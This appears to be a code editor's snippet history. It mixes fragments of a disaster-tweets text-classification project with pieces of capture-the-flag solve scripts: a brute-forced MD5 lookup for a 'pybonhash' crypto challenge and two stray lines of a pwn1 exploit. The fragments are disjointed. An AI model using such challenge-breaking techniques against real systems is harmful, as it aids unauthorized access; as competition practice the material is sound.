14d3a4e3ff0f7f3a1dca78c49c32d685|file:///home/neo/test|2|1|V|
	MyFunction("abc")
e19aaa9acd857fe46925a4bcec355af5|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|11|5|V|python
	    and remove words containing numbers.'''
fae7fcdd2748349a53c728b8e898dde1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|10|5|V|python
	    '''Make text lowercase, remove text in square brackets,remove links,remove punctuation
d73d3d1b1ba7d00b053794e965010c8b|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|18|5|V|python
	    filter(lambda x: x in set(string.printable), text) # Remove
b9cba604cfebfdbb3d1c6046f261c32e|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|11|1|V|python
	    # text = re.sub('\[.*?\]', '', text)
aae17fa44fa0f7408493a4fd2f35cbc7|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	def clear_text(text):
	    # text = text.lower() # Lowers score, doesn't make sense
	    # text = re.sub('\[.*?\]', '', text)
	    # text = re.sub('https?://\S+|www\.\S+', '', text)
	    text = re.sub('"|@', '', text) # No change
	    # text = re.sub('[%s]' % re.escape(string.punctuation), '', text)
	    text = re.sub('\n', '', text) # Remove newlines, increase in score
	    # text = re.sub('\w*\d\w*', '', text)
	    text = text.encode("ascii", errors="ignore").decode() # Remove non ascii chars, increase
	    return text
66a77ad015ee56fb14b4e5a8aba133e3|file:///home/neo/Documents/epl448/disaster-tweets/test.py|1|1|V|python
	import numpy as np
	import pandas as pd 
	import seaborn as sns
	import re
	import nltk
	from nltk.corpus import stopwords
	from nltk.stem.porter import PorterStemmer
	from sklearn.feature_extraction.text import CountVectorizer
	from sklearn.model_selection import train_test_split
	from sklearn.model_selection import GridSearchCV
	from sklearn.tree import DecisionTreeClassifier
	from sklearn.ensemble import GradientBoostingClassifier
	from sklearn.neighbors import KNeighborsClassifier
	from sklearn.linear_model import LogisticRegression
	from sklearn.linear_model import SGDClassifier
	from sklearn.svm import SVC
	from sklearn.naive_bayes import BernoulliNB
	from sklearn.naive_bayes import GaussianNB
	from sklearn.naive_bayes import MultinomialNB
	from sklearn.ensemble import VotingClassifier
	from sklearn.metrics import f1_score
	from sklearn import feature_extraction, linear_model, model_selection, preprocessing
2165a3ac278eb64f0d36dac4f79fbeda|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	import numpy as np
4af517ef739f700432dc8122b81bb1e4|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	import pandas as pd 
7a5e7ea9f21c7f1ca8247cd0c7356ac1|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	import seaborn as sns
a7b84d6354b9ad7f50b580037fe70ae2|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	import re
ab6a92e245fcda10611d3bf6a5c1cf22|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	import nltk
3e26cfb56fd3b8ed8b31128b49f807e0|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|9|1|V|python
	from nltk.corpus import stopwords
74f2081c9089a8fd4de6676ada755cdd|file:///home/neo/Documents/epl448/disaster-tweets/tweets.py|36|1|V|python
	train_df = pd.read_csv("datasets/train.csv")
	test_df = pd.read_csv("datasets/test.csv")
	train_df['text'] = train_df['text'].apply(lambda x: clear_text(x))
	test_df['text'] = test_df['text'].apply(lambda x: clear_text(x))
	
	stop_words = set(stopwords.words('english'))
	
	# Remove the stopwords from train and test dataset
	train_remove_stopwords = []
	for i, sentence in enumerate(train_df["text"]):
	    train_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	test_remove_stopwords = []
	for i, sentence in enumerate(test_df["text"]):
	    test_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	
	for i, _ in enumerate(train_df["text"]):
	    train_df["text"].values[i] = train_remove_stopwords[i]
	for i, _ in enumerate(test_df["text"]):
	    test_df["text"].values[i] = test_remove_stopwords[i]
09c02e89879f699c056ff09bad35f326|file:///home/neo/Documents/epl448/disaster-tweets/test.py|84|1|V|python
	corpus  = []
	pstem = PorterStemmer()
93d315ae2a85e7db09b83982df3dc90e|file:///home/neo/Documents/epl448/disaster-tweets/test.py|65|1|V|python
	pstem = PorterStemmer()
cfd0a6b375aa951875e3cd14ceef2478|file:///home/neo/Documents/epl448/disaster-tweets/test.py|54|5|V|python
	    pstem = PorterStemmer()
a6c00cd6e20ed7612f7d9768e64d6fbf|file:///home/neo/Documents/epl448/disaster-tweets/test.py|17|1|V|python
	from sklearn.naive_bayes import BernoulliNB
	from sklearn.naive_bayes import GaussianNB
	from sklearn.naive_bayes import MultinomialNB
09b4113005954b2abb9525597f94c0c7|file:///home/neo/Documents/epl448/disaster-tweets/test.py|90|1|V|python
	# print(uniqueWordFrequents)
	
b9c05eeb0635e573d0e248da638769e2|file:///home/neo/Documents/epl448/disaster-tweets/test.py|12|1|V|python
	from sklearn.ensemble import GradientBoostingClassifier
481dac2df7d5437144e508624d4ef23f|file:///home/neo/Documents/epl448/disaster-tweets/test.py|13|1|V|python
	from sklearn.linear_model import LogisticRegression
715490a42c9810c0f084ecc3cc4849bf|file:///home/neo/Documents/epl448/disaster-tweets/test.py|13|1|V|python
	from sklearn.linear_model import SGDClassifier
d9a8151e3f8e5ada10a424b3a63467d5|file:///home/neo/Documents/epl448/disaster-tweets/test.py|53|1|V|python
	    tweet = [pstem.stem(word) for word in tweet if not word in set(stopwords.words('english'))]
5ec26030809d07ed9b8c3ffcb6032459|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|10|1|V|python
	    # text = text.lower() # Lowers score, doesn't make sense
	    # text = re.sub('\[.*?\]', '', text)
	    # text = re.sub('https?://\S+|www\.\S+', '', text)
	    text = re.sub('"|@', '', text) # No change
	    # text = re.sub('[%s]' % re.escape(string.punctuation), '', text)
	    text = re.sub('\n', '', text) # Remove newlines, increase in score
	    # text = re.sub('\w*\d\w*', '', text)
	    text = text.encode("ascii", errors="ignore").decode() # Remove non ascii chars, increase
8772864c43e4ef5ffac9087d7b754e56|file:///home/neo/Documents/epl448/disaster-tweets/test.py|49|5|V|python
	    # text = text.lower() # Lowers score, doesn't make sense
1cb251ec0d568de6a929b520c4aed8d1|file:///home/neo/Documents/epl448/disaster-tweets/test.py|49|5|v|python
	text
73b5729a6e10f9a88a6139e5ec9a745a|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|22|1|V|python
	train_df['text'] = train_df['text'].apply(lambda x: clear_text(x))
	test_df['text'] = test_df['text'].apply(lambda x: clear_text(x))
d651d3fff2c9788a041a64f59688774e|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|28|1|V|python
	train_remove_stopwords = []
	for i, sentence in enumerate(train_df["text"]):
	    train_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	test_remove_stopwords = []
	for i, sentence in enumerate(test_df["text"]):
	    test_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	
	for i, _ in enumerate(train_df["text"]):
	    train_df["text"].values[i] = train_remove_stopwords[i]
	for i, _ in enumerate(test_df["text"]):
	    test_df["text"].values[i] = test_remove_stopwords[i]
b9e18d1e3f07228c3835be9fe60ae4d9|file:///home/neo/Documents/epl448/disaster-tweets/clear-data/tweets.py|9|1|V|python
	def clear_text(text):
	    # text = text.lower() # Lowers score, doesn't make sense
	    # text = re.sub('\[.*?\]', '', text)
	    # text = re.sub('https?://\S+|www\.\S+', '', text)
	    text = re.sub('"|@', '', text) # No change
	    # text = re.sub('[%s]' % re.escape(string.punctuation), '', text)
	    text = re.sub('\n', '', text) # Remove newlines, increase in score
	    # text = re.sub('\w*\d\w*', '', text)
	    text = text.encode("ascii", errors="ignore").decode() # Remove non ascii chars, increase
	    return text
	
	train_df = pd.read_csv("datasets/train.csv")
	test_df = pd.read_csv("datasets/test.csv")
	train_df['text'] = train_df['text'].apply(lambda x: clear_text(x))
	test_df['text'] = test_df['text'].apply(lambda x: clear_text(x))
	
	stop_words = set(stopwords.words('english'))
	
	# Remove the stopwords from train and test dataset
	train_remove_stopwords = []
	for i, sentence in enumerate(train_df["text"]):
	    train_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	test_remove_stopwords = []
	for i, sentence in enumerate(test_df["text"]):
	    test_remove_stopwords.append(' '.join([word for word in sentence.split(' ') if not word in stop_words]))
	
	for i, _ in enumerate(train_df["text"]):
	    train_df["text"].values[i] = train_remove_stopwords[i]
	for i, _ in enumerate(test_df["text"]):
	    test_df["text"].values[i] = test_remove_stopwords[i]
	
2931977a0501f6920ba2eb858dc2ef3c|file:///home/neo/Documents/epl448/disaster-tweets/test.py|55|1|V|python
	data_train = pd.read_csv("datasets/train.csv")
	data_test = pd.read_csv("datasets/test.csv")
	data_train['text'] = data_train['text'].apply(lambda x: clear_text(x))
	data_test['text'] = data_test['text'].apply(lambda x: clear_text(x))
bf93896ba725751f7ec6bcd05584ddff|file:///home/neo/Documents/epl448/disaster-tweets/test.py|27|1|V|python
	data_train  = pd.read_csv("datasets/train.csv")
9ff69247817eb52ea44318d2808e7fdc|file:///home/neo/Documents/epl448/disaster-tweets/test.py|27|1|V|python
	# print("Data shape = ",data_train .shape)
3f38241a23a35a1808a030f5c7ea7628|file:///home/neo/Documents/epl448/disaster-tweets/test.py|27|1|V|python
	# print(data_train .head())
09de512ff88e667dea9db0667518eabd|file:///home/neo/Documents/epl448/disaster-tweets/test.py|25|1|V|python
	data_train['text'] = data_train['text'].apply(lambda x: clear_text(x))
	data_test['text'] = data_test['text'].apply(lambda x: clear_text(x))
c3f62bccf2878d88d3384166eb3da79e|file:///home/neo/Documents/epl448/disaster-tweets/test.py|42|1|V|python
	# print(data_train .columns)
92daf0d8ef730f2e188549ee0d50507c|file:///home/neo/Documents/epl448/disaster-tweets/test.py|42|1|V|python
	# print(data_train["text"].head(10))
f2ddf4e38a456a2693c1897fcb1ee1f6|file:///home/neo/Documents/epl448/disaster-tweets/test.py|21|1|V|python
	print("Important libraries loaded successfully")
9c1c37de4eba05581d36ec62537db46a|file:///home/neo/Documents/epl448/disaster-tweets/test.py|59|35|v|python
	' '.join([pstem.stem(word) for word in sentence.split(' ') if not word in stop_words])
3d2c8d7a525ce8cfe5565dadc741f039|file:///home/neo/Documents/epl448/disaster-tweets/test.py|73|1|V|python
	#    tweet = re.sub("[^a-zA-Z]", ' ', data_train['text'][i])
ae8d18f3b54f1d925974c618a4528a37|file:///home/neo/Documents/epl448/disaster-tweets/test.py|25|5|v|python
	tweet
0555fde11882afef1bc2843d939a6b12|file:///home/neo/Documents/epl448/disaster-tweets/test.py|25|37|v|python
	data_train['text'][i]
bcffa7d0dc6984209439ebc630170763|file:///home/neo/Documents/epl448/disaster-tweets/test.py|12|1|V|python
	from sklearn.tree import DecisionTreeClassifier
2f06f78d529bd5f6e9e9592a075ecc89|file:///home/neo/Documents/epl448/disaster-tweets/test.py|72|3|V|python
	#for i in range(data_train['text'].shape[0]):
	#    #Remove unwanted words
	#    tweet = re.sub("[^a-zA-Z]", ' ', data_train['text'][i])
	#    #Transform words to lowercase
	#    tweet = tweet.lower()
	#    tweet = tweet.split()
	#    #Remove stopwords then Stemming it
	#    tweet = [pstem.stem(word) for word in tweet if not word in set(stopwords.words('english'))]
	#    tweet = ' '.join(tweet)
	#    #Append cleaned tweet to corpus
	#    corpus.append(tweet)
58d3583d2af1b8c269ce828f2ed3a7a7|file:///home/neo/Documents/epl448/disaster-tweets/test.py|11|1|V|python
	from sklearn.model_selection import GridSearchCV
d7394f635e44a2b30d317669345d8a2c|file:///home/neo/Documents/epl448/disaster-tweets/test.py|12|1|V|python
	from sklearn.svm import SVC
72d72e1eb2f07d25b97352b54b6fc62c|file:///home/neo/Documents/epl448/disaster-tweets/test.py|12|1|V|python
	from sklearn.ensemble import VotingClassifier
d176a3493433c22db53431bf8ea4e332|file:///home/neo/CTFs/midnightsun2020/pwn1/exploit.py|61|1|V|python
	payload +=  
1a16de1fe49606cbdeb81ab1cdb4fdcf|file:///home/neo/CTFs/midnightsun2020/pwn1/exploit.py|45|1|V|python
	libc = ELF('./libc.so')
f31635c7912098eba097b0e85dc20d5f|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|14|1|V|python
	if not len(key) == 42:
	    raise AssertionError
	else:
3dd0cd797a7399b56c470612887108eb|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1|^v|text
	testtesttesttest
6db19bfc5ca8c97a99f87b84fd7460f0|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1|^v|text
	testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
76728c0a476fa96213cc425346733189|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1|v|text
	testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
566013ab71874847c83608e6bada005b|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|40|5|V|python
	    thiskey = bytes([key1, key2]) * 16
236526b3eec41daae4b97efa7fc55740|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|41|5|V|python
	    print([key1, key2])
1a34cc5c7ea311c58da9e03f13cb18cc|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|41|5|V|python
	    print(thiskey)
69edd8b8f1040409a49eb40008dd6d65|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1|V|text
	testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
e0aca0ce029bb3cd759ba73bbc3e7dca|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1515|v|text
	sttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestt
cc200305d584b207f5d47140f2c1a72a|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|1414|v|text
	esttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttestte
809203a10a54f1a188c7d25457cb7065|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|301|v|text
	testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
fee5407057678b4ab59e19145a151c68|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|28|1|V|python
	print(FIB[10])
8359c125852d203c1ddbb665187aa7d5|file:///home/neo/CTFs/midnightsun2020/pybonhash/test.txt|1|201|v|text
	testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
c5f1304ad4911481b7c61af6272f8842|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|15|1|V|python
	if not len(data) >= 191:
225fedc3b6bbb1172e91b779dd8dca5c|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|7|1|V|python
	print(encrypted_data_hexlified)
a806baccb5915ffe436d68b540205917|file:///home/neo/ccsc/djinn/solve.py|35|1|V|python
	    possible = string.ascii_letters+string.digits
	    possible = it.imap(''.join, it.product(possible, repeat=4))
c62bc5879f2e5cdc9856e37236df02b2|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|6|1|V|python
	for a in string.ascii_letters:
	    for b in string.ascii_letters:
6fcc4b7d36184ba33346b4be2d5d8244|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|6|7|v|python
	possible
6e043b7cc3124b69a097b1481ba7e819|file:///home/neo/ccsc/djinn/solve.py|3|1|V|python
	import itertools as it
6bb363b2a31e109b9f39e28658238500|file:///home/neo/ccsc/djinn/solve.py|6|1|V|python
	import multiprocessing as mp
672dc420c3318c49073845fa5098e3fc|file:///home/neo/ccsc/djinn/solve.py|37|1|V|python
	    pool = mp.Pool(32)
b84710a11a42ba32d1e55f9ac55e1bf4|file:///home/neo/ccsc/djinn/solve.py|45|1|V|python
	    pool.close()
e0c72008f1b8828798d91434b51f352b|file:///home/neo/ccsc/djinn/solve.py|39|1|V|python
	    for c in pool.imap_unordered(check, possible, chunksize=100000):
cdb5cdb8cbc97276fa7a45f608b44444|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|10|1|V|python
	for obj in possible:
0ba4439ee9a46d9d9f14c60f88f45f87|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|9|30|v|python
	check
71901042b7c9227d01109b82f23df1d7|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|37|14|v|python
	bytes([data1, data2])
	    toencrypt = 
48978bf3b4f548ec4c1e4a32373255d6|file:///home/neo/CTFs/midnightsun2020/pybonhash/z3-pybonhash.py|38|17|v|python
	bytes(hashlib.md5(tohash).hexdigest(), 'utf-8')
b7b77bd3ee9d9b391abab82ddd524b11|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|14|5|V|python
	    print(mappings[c[0]])
52d418cdba5f6bb02da55fe20c1fd01e|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|14|1|V|python
	for key, val
8a22ee5f044857a658b0f6a05c06bb7f|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|12|1|V|python
	for pos in possible:
	    print(pos)
71685033f9f763ecfeaa6f5f70542453|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|14|5|V|python
	    print(possible)
19802fb1a1b84059dc67035b775bd75f|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|15|5|V|python
	    print(possible[i])
3bfacaa067a6c3fa969a16393913853a|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|15|5|V|python
	    i += 1
31f4392e749a2e37448fe192789c9732|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|15|5|V|python
	    print(c)
fd1c078bd32c043001fd64fe478b2f0f|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|16|1|V|python
	    pt = c[0] print(pt)
	    md5hash = c[1]
	    print(md5hash)
a7a0201f718037e3023cc10a711cc4f0|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|16|1|V|python
	print(mapp)
9a91e762e3eecd1179e6f6005c7c6653|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|16|1|V|python
	print(mappings.items())
cc9c1bbd48fd45ed8619732aa98a96a7|file:///home/neo/CTFs/midnightsun2020/pybonhash/md5hashes.py|1|1|V|python
	#!/usr/bin/python3
	import string, hashlib
	import itertools as it
	import multiprocessing as mp
	
	mappings = {}
	def hashit(pt):
	    return pt, hashlib.md5(bytes(pt, 'utf-8')).hexdigest()
	
	possible = string.ascii_letters+string.digits
	possible = map(''.join, it.product(possible, repeat=2))
	pool = mp.Pool(32)
	i = 0
	for c in pool.imap_unordered(hashit, possible, chunksize=100000):
	    mappings[c[0]] = c[1]
	pool.close()
e1bcd7f885e9d03e0f17e1e31740bf26|file:///home/neo/CTFs/midnightsun2020/pybonhash/code.py|19|1|V|python
	FIBOFFSET = 4919
	MAXFIBSIZE = len(key) + len(data) + FIBOFFSET
3e886e05b3a15b8dfcc0c292a9d65e14|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|27|1|V|python
	# print(encrypted_data)
40ea7bc2d913ed25201d96cf64bec1e4|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|24|1|V|python
	print(len(encrypted_data_hexlified))
69c5689c10b077510f944564f1a5f20f|file:///home/neo/CTFs/midnightsun2020/pybonhash/code.py|22|1|V|python
	def fibseq(n):
	    out = [0, 1]
	    for i in range(2, n):
	        out += [out[(i - 1)] + out[(i - 2)]]
	    return out
406b16190665a7c5d7a2888f43c22a3c|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|7|1|V|python
	FIBOFFSET = 4919
	MAXFIBSIZE = 42 + 408 + FIBOFFSET
	secret = b'?' * 42
	data = b'?' * 408
	mappings = {}
59bb1ecd8f50708ac59b451130ee2310|file:///home/neo/CTFs/midnightsun2020/pybonhash/code.py|29|1|V|python
	FIB = fibseq(MAXFIBSIZE)
	i = 0
	output = ''
	while i < len(data):
	    data1 = data[(FIB[i] % len(data))]
	    key1 = key[((i + FIB[(FIBOFFSET + i)]) % len(key))]
	    i += 1
	    data2 = data[(FIB[i] % len(data))]
	    key2 = key[((i + FIB[(FIBOFFSET + i)]) % len(key))]
	    i += 1
	    tohash = bytes([data1, data2])
	    toencrypt = hashlib.md5(tohash).hexdigest()
	    print(toencrypt)
	    thiskey = bytes([key1, key2]) * 16
	    cipher = AES.new(thiskey, AES.MODE_ECB)
	    enc = cipher.encrypt(toencrypt)
	    output += binascii.hexlify(enc).decode('ascii')
3272387cfeab692e2b1fe039bb27c960|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|44|5|V|python
	    tohash = bytes([data1, data2])
cd7a47095b8ccb6d1fc1256991041229|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|44|5|V|python
	    toencrypt = hashlib.md5(tohash).hexdigest()
32609bdf4721e77e845db03830cdf116|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|44|5|V|python
	    print(toencrypt)
420280ec02f66e178d565d75b252c2b8|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|32|1|V|python
	encrypted_data_hexlified = encrypted_file.read()
a50ab6898383dadb87ef5c958d6d84df|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|1|1|V|python
	h!/usr/bin/python3
c261dc4b45536fa7a10f4303ccb73bee|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|39|1|V|python
	for key in keys:
	    print(len(key))
	    print(bytes(key, 'utf-8'))
	
ebe5c07d1c3d7e2359655161985042fe|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|50|26|v|python
	thiskey
7a6ca447879b06451713735894555673|file:///home/neo/CTFs/midnightsun2020/pybonhash/code.py|10|1|V|python
	import string, sys, hashlib, binascii
cbbc4226d5a89df8f9679e7c215d5b3d|file:///home/neo/CTFs/midnightsun2020/pybonhash/code.py|11|1|V|python
	from Crypto.Cipher import AES
887aed03afc5c086e0b76d613f165159|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|53|30|v|python
	toencrypt
5666290e2d7115f933e4fc3e721fdbd6|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|54|1|V|python
	    # target = encrypted_blocks[int(i/2)]
e95a5da5ac323d14e1aaef78cbf45576|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|58|13|V|python
	            print(enc)
0a58f36ebc6d3e0f803f3d4efd995b20|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|59|16|V|python
	            if enc == target:
	                print("ole")
fff063c8147c4297b624666f1b050995|file:///home/neo/CTFs/midnightsun2020/pybonhash/decrypt.py|49|1|V|python
	    data_pos1 = FIB[i] % len(data)
	    key_pos1 = (i + FIB[(FIBOFFSET + i)]) % len(key)
	    i += 1
	    data_pos2 = FIB[i] % len(data)
	    key_pos2 = (i + FIB[(FIBOFFSET + i)]) % len(key)
	    i += 1
abcbd98bf2f8f5ca2df83523a366bfb1|untitled:1|1|1|v|
	0: '
6f23e23314da0db9180aae8b02627c99|untitled:1|1|43|v|
	, 1: '
1ae2b45048f6bf0f7bf08a950ad60aca|untitled:1|1|43|v|
	, 2: '
74c3cd2374bcb288edb5e92bbfebfc7a|untitled:1|1|43|v|
	, 3: '
6c706a8c4ca8966fdccf5504f77804aa|untitled:1|1|43|v|
	, 4: '
913ffa7c1e271906c05ed29985fd18d7|untitled:1|1|43|v|
	, 5: '
f0072744bdf716aa111f0526e2d1eae2|untitled:1|1|43|v|
	, 6: '
ccf2ea6121e8319138a35c55fd30dae9|untitled:1|1|43|v|
	, 7: '
02ffd2a24df98e568dd832311d9a40ae|untitled:1|1|43|v|
	, 8: '
20e79f1d706bb43a4cce93c664bf51c9|untitled:1|1|43|v|
	, 9: '
291ec48540487174fd4cd4ec1dd1efb1|untitled:1|1|43|v|
	, 10: '
9539a8d8cc576e00c0a4c239eb346151|untitled:1|1|43|v|
	, 11: '
7c0094382455bb0d634bd554f7e154f0|untitled:1|1|43|v|
	, 12: '
50230c3c88ab74c2fbaad146ff283ba9|untitled:1|1|43|v|
	, 13: '
6609a2f5bcf5eb59a40afbf8f823216f|untitled:1|1|43|v|
	, 14: '
a2399b5c85aace9711fe71e87e6847ba|untitled:1|1|43|v|
	, 15: '
6d5706bad5e86e1b2e794ce0b1660916|untitled:1|1|43|v|
	, 18: '
035c7ec54f6ae4bbea1a60676a4b33fd|untitled:1|1|43|v|
	, 19: '
b251009e017ad0e423a39a2b05e925ef|untitled:1|1|43|v|
	, 20: '
c2da4d3e644e7865ce5b35da7cf1d6b7|untitled:1|1|43|v|
	, 21: '
332092bf79e91dcf2ab787d2338ffe7e|untitled:1|1|43|v|
	, 16: '
0d031c53388e8d9f3017518d382b417f|untitled:1|1|43|v|
	, 22: '
fe58b381d1a06e819d997923789fbcae|untitled:1|1|43|v|
	, 24: '
7868bf06ff076a284f384988f2b2328b|untitled:1|1|43|v|
	, 23: '
61cccdd52adbf8679ee429101d8c8ee5|untitled:1|1|43|v|
	, 25: '
ef15efa90b2bfd3aaef89867b35246e9|untitled:1|1|43|v|
	, 17: '
9870e5fe81b496893cba943b0c3266b8|untitled:1|1|43|v|
	, 26: '
35655d1afc92f38af2ab324063bc00fd|untitled:1|1|43|v|
	, 27: '
7c6133b0ff520d04f1c4e8223143bdd8|untitled:1|1|43|v|
	, 29: '
cbbe288f342646610aa6cbd108a20e28|untitled:1|1|43|v|
	, 28: '
e949e8e573962bced2111ef6c0686b8f|untitled:1|1|43|v|
	, 30: '
88bd10e6581d8c540afa910d8c20bbd8|untitled:1|1|43|v|
	, 31: '
c3c6211223aaef55418456902510c202|untitled:1|1|43|v|
	, 32: '
8a68b7f7e375fcfd38e402d967b0772b|untitled:1|1|43|v|
	, 35: '
31850920b3b630fee71b99818831e50d|untitled:1|1|43|v|
	, 36: '
558593bebb8f05e2e399000efc508c4f|untitled:1|1|43|v|
	, 33: '
c10d033c32cd8c9a4dc64d03ad5de48d|untitled:1|1|43|v|
	, 39: '
caa4ca97b82f0d22ea6db9bb5da4ff9c|untitled:1|1|43|v|
	, 38: '
eb5360c2932d0cfb8c994f089ef4e86e|untitled:1|1|43|v|
